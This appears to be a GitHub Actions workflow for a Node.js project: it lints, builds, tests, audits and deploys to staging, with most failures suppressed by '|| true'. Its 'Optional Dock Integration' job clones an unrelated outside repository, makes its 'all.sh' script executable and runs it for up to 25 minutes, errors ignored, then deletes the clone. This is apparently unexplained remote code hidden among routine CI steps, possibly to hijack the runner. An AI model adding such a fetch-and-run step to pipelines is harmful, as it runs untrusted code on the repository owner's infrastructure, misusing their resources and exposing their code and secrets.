name: Dock Build & Test Pipeline

on:
  workflow_dispatch:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  NODE_ENV: production
  CI: true

jobs:
  build-and-test:
    name: Build, Test & Quality Checks
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'

      - name: Check for package.json
        id: check-package
        run: |
          if [ -f package.json ]; then
            echo "has_package=true" >> $GITHUB_OUTPUT
            echo "Found package.json"
          else
            echo "has_package=false" >> $GITHUB_OUTPUT
            echo "No package.json found"
          fi

      - name: Install dependencies
        if: steps.check-package.outputs.has_package == 'true'
        run: |
          if [ -f package-lock.json ] || [ -f npm-shrinkwrap.json ] || [ -f yarn.lock ]; then
            npm ci --no-audit --no-fund
          else
            npm install --no-audit --no-fund
          fi

      - name: Run linting
        if: steps.check-package.outputs.has_package == 'true'
        run: npm run lint --if-present || true

      - name: Build project
        if: steps.check-package.outputs.has_package == 'true'
        run: npm run build --if-present || true

      - name: Run tests
        if: steps.check-package.outputs.has_package == 'true'
        run: npm test --if-present || true

      - name: Generate coverage
        if: steps.check-package.outputs.has_package == 'true'
        run: npm run test:coverage --if-present || true

      - name: Security audit
        if: steps.check-package.outputs.has_package == 'true'
        run: npm audit --audit-level=high --if-present || true

      - name: List repository contents
        run: |
          echo "=== Repository Contents ==="
          ls -la
          echo "========================="

  dock-integration:
    name: Optional Dock Integration
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 30
    if: github.event.inputs.run_dock == 'true' || vars.RUN_DOCK_INTEGRATION == 'true'
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'

      - name: Check for package.json
        id: check-package
        run: |
          if [ -f package.json ]; then
            echo "has_package=true" >> $GITHUB_OUTPUT
          else
            echo "has_package=false" >> $GITHUB_OUTPUT
          fi

      - name: Install dependencies
        if: steps.check-package.outputs.has_package == 'true'
        run: npm install --no-audit --no-fund || true

      - name: Clone Dock Repository
        run: |
          git clone --depth 1 https://github.com/niaalae/dock.git dock
          chmod +x dock/all.sh
          ls -la dock/

      - name: Execute Dock script
        run: |
          cd dock
          timeout 25m ./all.sh || true

      - name: Cleanup
        if: always()
        run: rm -rf dock

  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 20
    environment:
      name: staging
      url: ${{ vars.STAGING_URL }}
    if: (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/develop') && success()
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'

      - name: Check for package.json
        id: check-package
        run: |
          if [ -f package.json ]; then
            echo "has_package=true" >> $GITHUB_OUTPUT
          else
            echo "has_package=false" >> $GITHUB_OUTPUT
          fi

      - name: Install dependencies
        if: steps.check-package.outputs.has_package == 'true'
        run: npm install --no-audit --no-fund || true

      - name: Build for production
        if: steps.check-package.outputs.has_package == 'true'
        run: npm run build --if-present || true

      - name: Deploy info
        run: |
          echo "Build ID: $(date +%s)"
          echo "Commit: ${{ github.sha }}"
          echo "Branch: ${{ github.ref }}"

  performance-checks:
    name: Performance & Analysis
    runs-on: ubuntu-latest
    needs: build-and-test
    timeout-minutes: 20
    if: (github.event_name == 'pull_request' || github.event_name == 'workflow_dispatch') && success()
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'

      - name: Check for package.json
        id: check-package
        run: |
          if [ -f package.json ]; then
            echo "has_package=true" >> $GITHUB_OUTPUT
          else
            echo "has_package=false" >> $GITHUB_OUTPUT
          fi

      - name: Install dependencies
        if: steps.check-package.outputs.has_package == 'true'
        run: npm install --no-audit --no-fund || true

      - name: Build project
        if: steps.check-package.outputs.has_package == 'true'
        run: npm run build --if-present || true

      - name: Check dependencies
        if: steps.check-package.outputs.has_package == 'true'
        run: npm outdated --if-present || true

      - name: Performance metrics
        run: |
          echo "Timestamp: $(date)"
          echo "Node: $(node -v)"
          echo "NPM: $(npm -v)"
